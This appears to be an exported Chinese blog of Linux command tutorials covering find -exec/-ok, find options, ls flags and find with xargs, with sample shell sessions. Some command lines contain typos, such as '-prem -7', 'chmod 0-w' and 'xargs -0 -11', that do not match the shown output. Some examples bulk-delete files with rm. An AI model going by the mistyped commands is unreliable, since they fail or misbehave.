./log2012.log-rw-r--r-- 1 root root 25 10-28 17:02 ./log.log-rw-r--r-- 1 root root 37 10-28 17:07 ./log.txt-rw-r--r-- 1 root root 0 10-28 14:47 ./test3/log3-2.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test3/log3-3.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test3/log3-1.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例中，find 命令匹配到了当前目录下的所有普通文件，并在 -exec 选项中使用 ls -l 命令将他们列出来。 实例2：在目录中查找更改时间在 n 日以前的文件并删除它们&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -mtime +14 -exec rm &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test]# ll总计 328-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 33 10-28 16:54 log2013.log-rw-r--r-- 1 root root 127 10-28 16:51 log2014.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.log-rw-r--r-- 1 root root 25 10-28 17:02 log.log-rw-r--r-- 1 root root 37 10-28 17:07 log.txtdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4[root@localhost test]# find . -type f -mtime +14 -exec rm &#123;&#125; \;[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 shell 中用任何方式删除文件之前，应当先查看相应的文件，一定要小心！当使用诸如 mv 或 rm 命令时，可以使用 -exec 选项的安全模式。它将在对每个匹配到的文件进行操作之前提示你。 实例3：在目录中查找更改时间在 n 日以前的文件并删除它们，在删除之前先给出提示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" -mtime +5 -ok rm &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -name "*.log" -mtime +5 -ok rm &#123;&#125; \;&lt; rm ... ./log_link.log &gt; ? y&lt; rm ... ./log2012.log &gt; ? n[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上例中，find 命令在当前目录中查找所有文件名以 .log 结尾、更改时间在5日以上的文件，并删除它们，只不过在删除之前先给出提示。按 y 键删除文件，按 n 键不删除。 实例4：-exec 中使用 grep 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc -name "passwd*" -exec grep "root" &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# find /etc -name "passwd*" -exec grep "root" &#123;&#125; \;root:x:0:0:root:/root:/bin/bashroot:x:0:0:root:/root:/bin/bash[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;任何形式的命令都可以在 -exec 选项中使用。在上例中使用 grep 命令。find 命令首先匹配所有文件名为 “passwd” 的文件，例如：passwd、passwd.old、paaswd.bak，然后执行 grep 命令看看在这些文件中是否存在一个 root 用户。 实例5：查找文件移动到指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" -exec mv &#123;&#125; .. \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost test]# ll总计 12drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:49 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# cd test3/[root@localhost test3]# ll总计 304-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.log[root@localhost test3]# find . -name "*.log" -exec mv &#123;&#125; .. \;[root@localhost test3]# ll总计 0[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:50 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# 实例6：用 exec 选项执行 cp 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" -exec cp &#123;&#125; test3 \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost test3]# ll总计 0[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:50 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -name "*.log" -exec cp &#123;&#125; test3 \;cp: “./test3/log2014.log” 及 “test3/log2014.log” 为同一文件cp: “./test3/log2013.log” 及 “test3/log2013.log” 为同一文件cp: “./test3/log2012.log” 及 “test3/log2012.log” 为同一文件[root@localhost test]# cd test3[root@localhost test3]# ll总计 304-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test3]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令概览]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F19.%20find%20%E5%91%BD%E4%BB%A4%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[find 命令概览&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 下 find 命令在目录结构中搜索文件，并执行指定的操作。Linux 下 find 命令提供了相当多的查找条件，功能很强大。由于 find 具有强大的功能，所以它的选项也很多，其中大部分选项都值得我们花时间来了解一下。即使系统中含有网络文件系统( NFS)，find 命令在该文件系统中同样有效，只要具有相应的权限。 在运行一个非常消耗资源的find命令时，很多人都倾向于把它放在后台执行，因为遍历一个大的文件系统可能会花费很长的时间(这里是指30G字节以上的文件系统)。 1.命令格式1find pathname -options [-print -exec -ok ...] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于在文件树中查找文件，并作出相应的处理 3.命令参数 pathname：find命令所查找的目录路径。例如用.来表示当前目录，用/来表示系统根目录。 -print：find命令将匹配的文件输出到标准输出。 -exec：find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ { } \;，注意{ }和\；之间的空格。 -ok：和-exec的作用相同，只不过以一种更为安全的模式来执行该参数所给出的shell命令，在执行每一个命令之前，都会给出提示，让用户来确定是否执行。 4.命令选项 -name 按照文件名查找文件。 -perm 按照文件权限来查找文件。 -prune 使用这一选项可以使find命令不在当前指定的目录中查找，如果同时使用-depth选项，那么-prune将被find命令忽略。 -user 按照文件属主来查找文件。 -group 按照文件所属的组来查找文件。 -mtime -n +n 按照文件的更改时间来查找文件， - n表示文件更改时间距现在n天以内，+ n表示文件更改时间距现在n天以前。find命令还有-atime和-ctime 选项，但它们都和-m time选项。 -nogroup 查找无有效所属组的文件，即该文件所属的组在/etc/groups中不存在。 -nouser 查找无有效属主的文件，即该文件的属主在/etc/passwd中不存在。 -newer file1 ! file2 查找更改时间比文件file1新但比文件file2旧的文件。 -type 查找某一类型的文件，诸如： b - 块设备文件。 d - 目录。 c - 字符设备文件。 p - 管道文件。 l - 符号链接文件。 f - 普通文件。 -size n：[c] 查找文件长度为n块的文件，带有c时表示文件长度以字节计。-depth：在查找文件时，首先查找当前目录中的文件，然后再在其子目录中查找。 -fstype：查找位于某一类型文件系统中的文件，这些文件系统类型通常可以在配置文件/etc/fstab中找到，该配置文件中包含了本系统中有关文件系统的信息。 -mount：在查找文件时不跨越文件系统mount点。 -follow：如果find命令遇到符号链接文件，就跟踪至链接所指向的文件。 -cpio：对匹配的文件使用cpio命令，将这些文件备份到磁带设备中。 另外,下面三个的区别: -amin n 查找系统中最后N分钟访问的文件 -atime n 查找系统中最后n*24小时访问的文件 -cmin n 查找系统中最后N分钟被改变文件状态的文件 -ctime n 查找系统中最后n*24小时被改变文件状态的文件 -mmin n 查找系统中最后N分钟被改变文件数据的文件 -mtime n 查找系统中最后n*24小时被改变文件数据的文件 使用实例实例1：查找指定时间内修改过的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find -atime -2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@peidachang ~]# find -atime -2../logs/monitor./.bashrc./.bash_profile./.bash_history &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找 48 小时内修改过的文件 实例2：根据关键字查找&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost test]# find . -name "*.log" ./log_link.log./log2014.log./test4/log3-2.log./test4/log3-3.log./test4/log3-1.log./log2013.log./log2012.log./log.log./test5/log5-2.log./test5/log5-3.log./test5/log.log./test5/log5-1.log./test5/test3/log3-2.log./test5/test3/log3-3.log./test5/test3/log3-1.log./test3/log3-2.log./test3/log3-3.log./test3/log3-1.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在当前目录查找以 .log 结尾的文件。“.” 代表当前目录 实例3：按照目录或文件的权限来查找文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /opt/soft/test/ -perm 777 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# find /opt/soft/test/ -perm 777/opt/soft/test/log_link.log/opt/soft/test/test4/opt/soft/test/test5/test3/opt/soft/test/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找 /opt/soft/test/ 目录下，权限为 777 的文件 实例4：按类型查找&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -name "*.log" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost test]# find . -type f -name "*.log"./log2014.log./test4/log3-2.log./test4/log3-3.log./test4/log3-1.log./log2013.log./log2012.log./log.log./test5/log5-2.log./test5/log5-3.log./test5/log.log./test5/log5-1.log./test5/test3/log3-2.log./test5/test3/log3-3.log./test5/test3/log3-1.log./test3/log3-2.log./test3/log3-3.log./test3/log3-1.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找当前目录，以 .log 结尾的普通文件 实例5：查找当前所有目录并排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find .-type d |sort &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test]# find . -type d | sort../scf./scf/bin./scf/doc./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/info./scf/service/deploy/product./test3./test4./test5./test5/test3[root@localhost test]# 实例6：按大小查找文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -size +1000c -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test]# find . -size +1000c -print../test4./scf./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/product./scf/service/deploy/info./scf/doc./scf/bin./log2012.log./test5./test5/test3./test3[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找当前目录大于1K的文件]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ls]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F2.%20Linux%20%E5%91%BD%E4%BB%A4-ls%2F</url>
    <content type="text"><![CDATA[Linux 命令-lsls 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls命令是linux下最常用的命令。ls命令就是list的缩写，缺省下ls用来打印出当前目录的清单。如果ls指定其他目录，那么就会显示指定目录里的文件及文件夹清单。 通过ls 命令不仅可以查看linux文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。ls 命令在日常的linux操作中用的很多! 1.命令格式1ls [选项] [目录名] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出目标目录中所有的子目录和文件 3.常用参数： -a，-all 列出目录下所有的文件，包括以 . 开头的隐藏文件 -A 同 -a，但不列出“.”（表示当前目录）和“..”（表示当前目录的父目录） -c 配合 -lt：根据 ctime 排序及显示 ctime （文件状态最后更改的时间）配合 -l：显示 ctime 但根据名称排序否则根据 ctime 排序 -C 每栏由上至下列出项目 -color[=WHEN] 控制是否使用色彩分辨文件。WHEN 可以是‘never’、‘always’或‘auto’其中之一 -d，-directory 将目录象文件一样显示，而不是显示其下的文件 -D, –dired 产生适合 Emacs 的 dired 模式使用的结果 -f 对输出的文件不进行排序，-aU 选项生效，-lst 选项失效 -g 类似 -l,但不列出所有者 -G, –no-group 不列出任何有关组的信息 -h, –human-readable 以容易理解的格式列出文件大小 (例如 1K 234M 2G) –si 类似 -h,但文件大小取 1000 的次方而不是 1024 -H, –dereference-command-line 使用命令列中的符号链接指示的真正目的地 –indicator-style=方式 指定在每个项目名称后加上指示符号&lt;方式&gt;：none (默认)，classify (-F)，file-type (-p) -i, –inode 印出每个文件的 inode 号 -I, –ignore=样式 不印出任何符合 shell 万用字符&lt;样式&gt;的项目 -k 即 –block-size=1K,以 k 字节的形式表示文件的大小。 -l 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来。 -L, –dereference 当显示符号链接的文件信息时，显示符号链接所指示的对象而并非符号链接本身的信息 -m 所有项目以逗号分隔，并填满整行行宽 -o 类似 -l,显示文件的除组信息外的详细信息。 -r, –reverse 依相反次序排列 -R, –recursive 同时列出所有子目录层 -s, –size 以块大小为单位列出所有文件的大小 -S 根据文件大小排序 –sort=WORD 以下是可选用的 WORD 和它们代表的相应选项： extension -X status -c none -U time -t size -S atime -u time -t access -u version -v use -u -t 以文件修改时间排序 -u 配合 -lt:显示访问时间而且依访问时间排序 配合 -l:显示访问时间但根据名称排序 否则：根据访问时间排序 -U 不进行排序;依文件系统原有的次序列出项目 -v 根据版本进行排序 -w, –width=COLS 自行指定屏幕宽度而不使用目前的数值 -x 逐行列出项目而不是逐栏列出 -X 根据扩展名排序 -1 每行只列出一个文件 –help 显示此帮助信息并离开 –version 显示版本信息并离开 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，平时工作中最常用的是 -l 、-h 、-r 、-t 4.常用范例例1：列出/home/peidachang文件夹下的所有文件和目录的详细资料&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l -R /home/peidachang &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种形式和上面的命令形式执行的结果是完全一样的。另外，如果命令的操作对象位于当前目录中，可以直接对操作对象进行操作;如果不在当前目录则需要给出操作对象的完整路径，例如上面的例子中，我的当前文件夹是peidachang文件夹，我想对home文件夹下的peidachang文件进行操作，我可以直接输入 ls -lR peidachang，也可以用 ls -lR /home/peidachang。 例2：列出当前目录中所有以“t”开头的目录的详细内容，可以使用如下命令：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l t* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以查看当前目录下文件名以“t”开头的所有文件的信息。其实，在命令格式中，方括号内的内容都是可以省略的，对于命令ls而言，如果省略命令参数和操作对象，直接输入“ ls ”，则将会列出当前工作目录的内容清单。 例3：只列出文件下的子目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -F /opt/soft |grep /$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出 /opt/soft 文件下面的子目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost opt]# ls -F /opt/soft |grep /$jdk1.6.0_16/subversion-1.6.1/tomcat6.0.32/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l /opt/soft | grep "^d" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出 /opt/soft 文件下面的子目录详细情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost opt]# ls -l /opt/soft | grep "^d"drwxr-xr-x 10 root root 4096 09-17 18:17 jdk1.6.0_16drwxr-xr-x 16 1016 1016 4096 10-11 03:25 subversion-1.6.1drwxr-xr-x 9 root root 4096 2011-11-01 tomcat6.0.32 例4：列出目前工作目录下所有名称是s 开头的档案，愈新的排愈后面，可以使用如下命令：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -ltr s* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415[root@localhost opt]# ls -ltr s*src:总计 0script:总计 0soft:总计 350644drwxr-xr-x 9 root root 4096 2011-11-01 tomcat6.0.32-rwxr-xr-x 1 root root 81871260 09-17 18:15 jdk-6u16-linux-x64.bindrwxr-xr-x 10 root root 4096 09-17 18:17 jdk1.6.0_16-rw-r--r-- 1 root root 205831281 09-17 18:33 apache-tomcat-6.0.32.tar.gz-rw-r--r-- 1 root root 5457684 09-21 00:23 tomcat6.0.32.tar.gz-rw-r--r-- 1 root root 4726179 10-10 11:08 subversion-deps-1.6.1.tar.gz-rw-r--r-- 1 root root 7501026 10-10 11:08 subversion-1.6.1.tar.gzdrwxr-xr-x 16 1016 1016 4096 10-11 03:25 subversion-1.6.1 例5：列出目前工作目录下所有档案及目录;目录于名称后加”/“, 可执行档于名称后加”*“&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -AF &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12[root@localhost opt]# ls -AFlog/ script/ soft/ src/ svndata/ web/ 例6：计算当前目录下的文件数和目录数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 12ls -l * |grep "^-"|wc -l ---文件个数 ls -l * |grep "^d"|wc -l ---目录个数 例7: 在ls中列出文件的绝对路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls | sed "s:^:`pwd`/:" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost opt]# ls | sed "s:^:`pwd`/:" /opt/log/opt/script/opt/soft/opt/src/opt/svndata/opt/web 例8：列出当前目录下的所有文件（包括隐藏文件）的绝对路径， 对目录不做递归&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1find $PWD -maxdepth 1 | xargs ls -ld &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost opt]# find $PWD -maxdepth 1 | xargs ls -lddrwxr-xr-x 8 root root 4096 10-11 03:43 /optdrwxr-xr-x 2 root root 4096 2012-03-08 /opt/logdrwxr-xr-x 2 root root 4096 2012-03-08 /opt/script drwxr-xr-x 5 root root 4096 10-11 03:21 /opt/softdrwxr-xr-x 2 root root 4096 2012-03-08 /opt/srcdrwxr-xr-x 4 root root 4096 10-11 05:22 /opt/svndatadrwxr-xr-x 4 root root 4096 10-09 00:45 /opt/web 例9：递归列出当前目录下的所有文件（包括隐藏文件）的绝对路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1find $PWD | xargs ls -ld 例10：指定文件时间输出格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -tl --time-style=full-iso &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123[root@localhost soft]# ls -tl --time-style=full-iso 总计 350644drwxr-xr-x 16 1016 1016 4096 2012-10-11 03:25:58.000000000 +0800 subversion-1.6.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令: 1ls -ctl --time-style=long-iso &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123[root@localhost soft]# ls -ctl --time-style=long-iso总计 350644drwxr-xr-x 16 1016 1016 4096 2012-10-11 03:25 subversion-1.6.1 扩展：1. 显示彩色目录列表&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开/etc/bashrc, 加入如下一行: alias ls="ls --color" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下次启动bash时就可以像在Slackware里那样显示彩色的目录列表了, 其中颜色的含义如下: 蓝色–&gt;目录 绿色–&gt;可执行文件 红色–&gt;压缩文件 浅蓝色–&gt;链接文件 灰色–&gt;其他文件]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令之 xargs]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F21.%20find%20%E5%91%BD%E4%BB%A4%E4%B9%8B%20xargs%2F</url>
    <content type="text"><![CDATA[find 命令之 xargs&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在使用 find命令的-exec选项处理匹配到的文件时， find命令将所有匹配到的文件一起传递给exec执行。但有些系统对能够传递给exec的命令长度有限制，这样在find命令运行几分钟之后，就会出现溢出错误。错误信息通常是“参数列太长”或“参数列溢出”。这就是xargs命令的用处所在，特别是与find命令一起使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;find命令把匹配到的文件传递给xargs命令，而xargs命令每次只获取一部分文件而不是全部，不像-exec选项那样。这样它可以先处理最先获取的一部分文件，然后是下一批，并如此继续下去。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在有些系统中，使用-exec选项会为处理每一个匹配到的文件而发起一个相应的进程，并非将匹配到的文件全部作为参数一次执行；这样在有些情况下就会出现进程过多，系统性能下降的问题，因而效率不高； 而使用xargs命令则只有一个进程。另外，在使用xargs命令时，究竟是一次获取所有的参数，还是分批取得参数，以及每一次获取参数的数目都会根据该命令的选项及系统内核中相应的可调参数来确定。 使用实例实例1：查找系统中的每一个普通文件，然后使用 xargs 命令来测试他们分别属于哪类文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -print | xargs file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 0 11-12 22:25 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -type f -print | xargs file./log2014.log: empty./log2013.log: empty./log2012.log: ASCII text[root@localhost test]# 实例2：在整个系统中查找内存信息转储文件（core dump），然后把结果保存到 /tmp/core.log 文件中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find / -name "core" -print | xargs echo "" &gt; /tmp/core.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# find / -name "core" -print | xargs echo "" &gt;/tmp/core.log[root@localhost test]# cd /tmp[root@localhost tmp]# ll总计 16-rw-r--r-- 1 root root 1524 11-12 22:29 core.logdrwx------ 2 root root 4096 11-12 22:24 ssh-TzcZDx1766drwx------ 2 root root 4096 11-12 22:28 ssh-ykiRPk1815drwx------ 2 root root 4096 11-03 07:11 vmware-root 实例3：在当前目录下查找所有用户具有读、写和执行权限的文件，并收回相应的写权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -prem -7 -print | xargs chmod 0-w &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 0 11-12 22:25 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 11-12 19:32 test3drwxrwxrwx 2 root root 4096 11-12 19:32 test4[root@localhost test]# find . -perm -7 -print | xargs chmod o-w[root@localhost test]# ll总计 312-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 0 11-12 22:25 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 19:32 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行命令后，文件夹 scf 、test3 和 test4 的权限都发生改变 实例4：用 grep 命令在所有的普通文件中搜索 hostname 这个词&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -print | xargs grep "hostname" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# find . -type f -print | xargs grep "hostname"./log2013.log:hostnamebaidu=baidu.com./log2013.log:hostnamesina=sina.com./log2013.log:hostnames=true[root@localhost test]# 实例5：用 grep 命令在当前目录下的所有普通文件中搜索 hostnames 这个词&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name \* -type f -print | xargs grep "hostnames" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@peida test]# find . -name \* -type f -print | xargs grep "hostnames"./log2013.log:hostnamesina=sina.com./log2013.log:hostnames=true[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，在上例中， \ 用来取消 find 命令中的 * 在 shell 中的特殊含义。 实例6：使用 xargs 执行 mv1find . -name "*.log" | xargs -i mv &#123;&#125; test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-03 06:19 log2012.log-rw-r--r-- 1 root root 61 11-12 22:44 log2013.log-rw-r--r-- 1 root root 0 11-12 22:25 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-12 22:54 test3drwxrwxr-x 2 root root 4096 11-12 19:32 test4[root@localhost test]# cd test4/[root@localhost test4]# ll总计 0[root@localhost test4]# cd ..[root@localhost test]# find . -name "*.log" | xargs -i mv &#123;&#125; test4[root@localhost test]# ll总计 12drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 05:50 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# cd test4/[root@localhost test4]# ll总计 304-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test4]# 实例7：find 后执行 xargs 提示 xargs：argument line too long 解决方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type f -atime +0 -print0 | xargs -0 -11 -t rm -f &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@pd test4]# find . -type f -atime +0 -print0 | xargs -0 -l1 -t rm -frm -f [root@pdtest4]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-11 是一次处理一个； -t 是处理之前打印出命令 实例8：使用 -i 参数默认的前面输出用 {} 代替， -I 参数可以指定其他代替字符，如例子中的 []&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "file" | xargs -I [] cp [] .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost test]# ll总计 12drwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 05:50 test3drwxrwxr-x 2 root root 4096 11-13 05:50 